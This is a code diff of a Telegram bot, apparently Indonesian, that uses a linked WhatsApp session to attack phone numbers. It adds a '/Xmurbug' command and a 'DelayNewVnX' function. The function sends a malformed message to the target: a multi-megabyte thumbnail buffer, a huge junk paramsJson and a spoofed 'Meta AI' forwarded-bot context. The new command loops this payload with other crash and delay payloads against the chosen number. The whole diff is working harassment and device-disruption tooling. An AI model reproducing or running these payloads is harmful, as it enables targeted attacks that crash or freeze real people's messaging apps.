@@ -1337,6 +1337,7 @@ async function showxbugs(ctx, page = 1) {
 ⸙ /Xoya   62xxx  → Delay Bebas Spam For Murbug v1
 ⸙ /Xspam   62xxx  → Delay Bebas Spam For Murbug v2
 ⸙ /SummonDelay   62xxx  → Delay Bebas Spam For Murbug v3
+⸙ /Xmurbug   62xxx  → Delay Hard Bebas Spam For Murbug v4
 
 <blockquote>ִֶָ࣪☾. ( ! ) 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠 ࣪ ִֶָ☾.</blockquote>
 `;
@@ -2216,7 +2217,6 @@ bot.command("connect", checkOwner, async (ctx) => {
   ⬡═―⊱〔 REQUEST PAIRING 〕⊰―═⬡
 ϟ  Nomor  : ${phoneNumber}
 ϟ  Kode   : ${formattedCode}
-ϟ  Note  : KALO GAGAL PAIR HAPUS SESSION
 
 ϟ  🟡 Status : Waiting for connection...
 </pre>`,
@@ -2307,7 +2307,7 @@ bot.command("Xbug", checkAllPremium, checkWhatsAppConnection, checkCooldown, asy
 
   (async () => {
     for (let i = 0; i < 20; i++) {
-      await DelayInvis (sock, target);
+      await DelayInvis(sock, target);
       await sleep(2000);
       await PaysQl(sock, target);
       await sleep(1500);
@@ -2322,18 +2322,39 @@ bot.command("Xoya", checkAllPremium, checkWhatsAppConnection, checkCooldown, asy
 
   const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
+  const time = new Date().toLocaleTimeString("en-US", {
+    hour: "numeric",
+    minute: "2-digit",
+    second: "2-digit",
+    hour12: true
+  });
+
   await ctx.reply(
 `<pre>🛡️ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐀𝐭𝐭𝐚𝐜𝐤 𝐛𝐮𝐠𝐬
  ━━━━━━━━━━━━━━━
 ◇ 📤 Target : ${q}
-◇ 🦋 Type : DELAY BEBAS SPAM V1
+◇ 🦋 Type : DELAY INVISIBLE FOR MURBUG V4
 ◇ ☘️ Loop : Sedang Memasak
 ◇ 🏃🏻Runtime : ${runtime(process.uptime())}
-◇ ⚙️ Command : Xqoya Bugs
-◇ ⚡ Status : Success✅</pre>`,
+◇ 🏠Memory  : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
+◇ ⚙️ Command : Xmurbug Bugs
+◇ ⚡ Status : Success✅
+
+  [ 🚨OPERATION FINISHED🚨 ]
+        Time : ${time}</pre>`,
     { parse_mode: "HTML" }
   );
 
+  (async () => {
+    for (let r = 0; r < 15; r++) {
+      await SukaSukaDiley(sock, target);
+      await sleep(1000);
+      await VsxFc(sock, target);
+      await sleep(1000);
+    }
+  })();
+});
+  
   (async () => {
     for (let r = 0; r < 8; r++) {
       await SukaSukaDiley(sock, target);
@@ -2345,23 +2366,33 @@ bot.command("Xoya", checkAllPremium, checkWhatsAppConnection, checkCooldown, asy
 bot.command("Xspam", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
 
   const q = ctx.message.text.split(" ")[1]; 
-  if (!q) return ctx.reply("🪧 ☇ Example : /Xspam 62xx");
+  if (!q) return ctx.reply("🪧 ☇ Example : /Xspam 62xx"); 
+  
+    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
-  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+  const time = new Date().toLocaleTimeString("Asia/Jakarta", {
+    hour: "numeric",
+    minute: "2-digit",
+    second: "2-digit",
+    hour12: true
+  });
 
   await ctx.reply(
 `<pre>🛡️ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐀𝐭𝐭𝐚𝐜𝐤 𝐛𝐮𝐠𝐬
  ━━━━━━━━━━━━━━━
 ◇ 📤 Target : ${q}
-◇ 🦋 Type : DELAY FOR MURBUG V2
+◇ 🦋 Type : DELAY INVISIBLE FOR MURBUG V2
 ◇ ☘️ Loop : Sedang Memasak
 ◇ 🏃🏻Runtime : ${runtime(process.uptime())}
 ◇ 🏠Memory  : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
 ◇ ⚙️ Command : Xspam Bugs
-◇ ⚡ Status : Success✅</pre>`,
+◇ ⚡ Status : Success✅
+
+  [ 🚨OPERATION FINISHED🚨 ]
+       Time : ${time}</pre>`,
     { parse_mode: "HTML" }
   );
-
+  
   (async () => {
     for (let r = 0; r < 10; r++) {
       await SukaSukaDiley(sock, target);
@@ -2376,22 +2407,31 @@ bot.command("SummonDelay", checkAllPremium, checkWhatsAppConnection, checkCooldo
 
   const q = ctx.message.text.split(" ")[1]; 
   if (!q) return ctx.reply("🪧 ☇ Example : /SummonDelay 62xx");
+  
+    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
-  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+  const time = new Date().toLocaleTimeString("Asia/Jakarta", {
+    hour: "numeric",
+    minute: "2-digit",
+    second: "2-digit",
+    hour12: true
+  });
 
   await ctx.reply(
 `<pre>🛡️ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐀𝐭𝐭𝐚𝐜𝐤 𝐛𝐮𝐠𝐬
  ━━━━━━━━━━━━━━━
 ◇ 📤 Target : ${q}
-◇ 🦋 Type : DELAY FOR MURBUG V3
+◇ 🦋 Type : DELAY INVISIBLE FOR MURBUG V3
 ◇ ☘️ Loop : Sedang Memasak
 ◇ 🏃🏻Runtime : ${runtime(process.uptime())}
 ◇ 🏠Memory  : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
 ◇ ⚙️ Command : SummonDelay Bugs
-◇ ⚡ Status : Success✅</pre>`,
+◇ ⚡ Status : Success✅
+
+  [ 🚨OPERATION FINISHED🚨 ]
+       Time : ${time}</pre>`,
     { parse_mode: "HTML" }
   );
-
   (async () => {
     for (let r = 0; r < 10; r++) {
       await SukaSukaDiley(sock, target);
@@ -2400,6 +2440,50 @@ bot.command("SummonDelay", checkAllPremium, checkWhatsAppConnection, checkCooldo
       await sleep(1000);
       await RxVzInvis(sock, target);
       await sleep(1500);
+    }
+  })();
+});
+/// ============= CASE BUG 5 BEBAS SPAM=============\\\
+bot.command("Xmurbug", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
+
+  const q = ctx.message.text.split(" ")[1]; 
+  if (!q) return ctx.reply("🪧 ☇ Example : /Xmurbug 62xx");
+
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+
+  const time = new Date().toLocaleTimeString("Asia/Jakarta", {
+    hour: "numeric",
+    minute: "2-digit",
+    second: "2-digit",
+    hour12: true
+  });
+
+  await ctx.reply(
+`<pre>🛡️ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐀𝐭𝐭𝐚𝐜𝐤 𝐛𝐮𝐠𝐬
+ ━━━━━━━━━━━━━━━
+◇ 📤 Target : ${q}
+◇ 🦋 Type : DELAY INVISIBLE FOR MURBUG V4
+◇ ☘️ Loop : Sedang Memasak
+◇ 🏃🏻Runtime : ${runtime(process.uptime())}
+◇ 🏠Memory  : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
+◇ ⚙️ Command : Xmurbug Bugs
+◇ ⚡ Status : Success✅
+
+  [ 🚨OPERATION FINISHED🚨 ]
+       Time : ${time}</pre>`,
+    { parse_mode: "HTML" }
+  );
+
+  (async () => {
+    for (let r = 0; r < 15; r++) {
+      await SukaSukaDiley(sock, target);
+      await sleep(1000);
+      await VsxFc(sock, target);
+      await sleep(1000);
+      await RxVzInvis(sock, target);
+      await sleep(1500);
+      await DelayNewVnX(sock, target);
+      await sleep(2000);
     }
   })();
 });
@@ -3118,6 +3202,38 @@ async function RxVzInvis(sock, target) {
         console.error('[RxVz] Error sending call:', error);
         throw error;
     }
+}
+
+async function DelayNewVnX(sock, target) {
+   const vnxnew = {
+     groupStatusMessageV2: {
+       message: {
+        interactiveResponseMessage: {
+          body: {
+           text: "⏳ VnX",
+            jpegThumbnail: Buffer.alloc(6 * 1024 * 1024 + 500000, 0xFF),
+            },
+            nativeFlowResponseMessage: {
+              name: "address_message",
+              paramsJson: "\x10".repeat(920 * 150),
+              version: 3 
+            },
+            contextInfo: {
+             isForwarded: true,
+               forwardingScore: 9999,
+               fromMe: true,
+            forwardedAiBotMessageInfo: {
+               botJid: "13135550202@bot",
+               botName: "Meta AI",
+               creator: "VnX"
+              }
+            }
+          }
+       }
+     }
+   };
+           
+  await sock.relayMessage(target, vnxnew, {});
 }
 
 // --- Jalankan Bot --- //
